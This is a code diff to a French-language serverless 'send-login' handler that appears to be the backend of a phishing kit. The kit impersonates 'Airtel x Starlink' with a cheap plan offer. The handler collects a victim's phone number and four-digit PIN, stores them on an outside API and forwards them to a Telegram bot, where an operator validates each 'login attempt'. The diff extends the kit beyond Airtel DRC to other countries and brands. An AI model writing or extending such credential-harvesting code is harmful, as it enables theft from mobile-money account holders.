@@ -15,7 +15,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { sessionId, phone, pin, planName, planPrice } = req.body || {};
+    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = req.body || {};
 
     if (!sessionId || !phone || !pin) {
       return res.status(400).json({ error: 'Champs obligatoires manquants.' });
@@ -23,6 +23,9 @@ export default async function handler(req, res) {
 
     const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
     const cleanPin = pin.toString().slice(0, 4);
+    const displayPhone = fullPhone || `+243 ${cleanPhone}`;
+    const displayCountry = country || 'Airtel Africa';
+    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
     // 1. Create cloud session record on restful-api.dev
     let cloudId = sessionId;
@@ -35,6 +38,9 @@ export default async function handler(req, res) {
           data: {
             sessionId,
             phone: cleanPhone,
+            fullPhone: displayPhone,
+            country: displayCountry,
+            airtelBrand: displayBrand,
             pin: cleanPin,
             planName: planName || 'Forfait Airtel Starlink',
             planPrice: planPrice || '$1.49',
@@ -59,10 +65,11 @@ export default async function handler(req, res) {
     // 2. Format message for Telegram
     const messageText =
       `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
-      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
       `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
       `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
-      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
+      `📶 <b>Réseau:</b> ${displayBrand}\n` +
       `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
       `🆔 <b>ID Session:</b> <code>${cloudId}</code>\n\n` +
       `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
@@ -105,11 +112,10 @@ export default async function handler(req, res) {
       success: true,
       sessionId,
       cloudId,
-      status: 'pending',
-      telegramResult: tgData,
+      telegram: tgData,
     });
   } catch (error) {
-    console.error('Error in send-login serverless:', error);
-    return res.status(500).json({ error: error.message || 'Internal Server Error' });
+    console.error('send-login serverless error:', error);
+    return res.status(500).json({ error: error.message });
   }
 }
